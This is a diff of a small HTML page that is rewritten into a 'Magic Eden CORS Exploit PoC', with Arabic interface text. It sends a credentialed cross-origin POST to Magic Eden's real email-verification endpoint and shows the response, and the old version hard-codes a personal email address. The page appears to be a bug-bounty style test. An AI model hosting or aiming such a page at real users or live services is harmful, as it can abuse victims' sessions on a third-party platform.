@@ -1,45 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>CORS Test</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f7f7f7; }
-        h1 { color: #333; }
-        pre { background: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }
-        .error { color: red; font-weight: bold; }
-        .success { color: green; font-weight: bold; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>CORS Exploit PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
+    input, button { padding: 10px; margin: 5px 0; width: 300px; }
+    pre { background: #222; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto; }
+  </style>
 </head>
 <body>
-    <h1>CORS Test</h1>
-    <p>Sending request...</p>
-    <div id="result"></div>
+  <h1>Magic Eden CORS Exploit PoC</h1>
+  <p>ادخل البريد اللي عايز تبعتله طلب التحقق:</p>
+  <input type="email" id="email" placeholder="your_email@example.com" />
+  <br />
+  <button onclick="sendRequest()">أرسل طلب التحقق</button>
 
-    <script>
-        const resultDiv = document.getElementById("result");
+  <h3>Response:</h3>
+  <pre id="response"></pre>
 
-        fetch("https://auth.magiceden.io/api/v0/sdk/c1314b5b-ece8-4b4f-a879-3894dda364e4/emailVerifications/create", {
-            method: "POST",
-            credentials: "include", // يرسل الكوكيز
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                email: "yahyashahin812@gmail.com" // عدل البريد لو حبيت
-            })
-        })
-        .then(response => {
-            resultDiv.innerHTML += `<p>Status: ${response.status} ${response.statusText}</p>`;
-            return response.text();
-        })
-        .then(data => {
-            resultDiv.innerHTML += `<pre class="success">${data}</pre>`;
-        })
-        .catch(error => {
-            resultDiv.innerHTML += `<p class="error">Error: ${error}</p>`;
-        });
-    </script>
+  <script>
+    function sendRequest() {
+      const email = document.getElementById('email').value;
+      const responseEl = document.getElementById('response');
+      responseEl.textContent = 'جاري الإرسال...';
+
+      fetch("https://auth.magiceden.io/api/v0/sdk/c1314b5b-ece8-4b4f-a879-3894dda364e4/emailVerifications/create", {
+        method: "POST",
+        credentials: "include",   // لتمرير الكوكيز (إذا موجودة)
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email: email })
+      })
+      .then(resp => {
+        responseEl.textContent = `Status: ${resp.status} ${resp.statusText}\n`;
+        return resp.text();
+      })
+      .then(data => {
+        responseEl.textContent += data;
+      })
+      .catch(err => {
+        responseEl.textContent = `Error: ${err}`;
+      });
+    }
+  </script>
 </body>
 </html>
-
